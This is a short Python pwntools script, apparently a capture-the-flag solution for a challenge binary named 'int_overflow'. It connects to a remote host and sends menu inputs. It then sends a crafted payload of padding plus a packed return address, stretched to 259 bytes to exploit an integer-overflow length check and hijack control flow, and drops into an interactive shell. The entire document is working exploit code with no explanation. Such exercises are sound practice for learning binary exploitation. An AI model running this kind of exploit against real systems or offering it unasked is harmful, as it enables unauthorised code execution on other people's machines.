from pwn import *

#sh = process('./int_overflow')
sh = remote('111.198.29.45',31719)

payload = 'a' * 24 + p32(0x0804868b)

payload = payload.ljust(259,'a')

sh.sendline('1')

sleep(0.1)

sh.sendline('a')

sleep(0.1)

sh.sendline(payload)

sh.interactive()
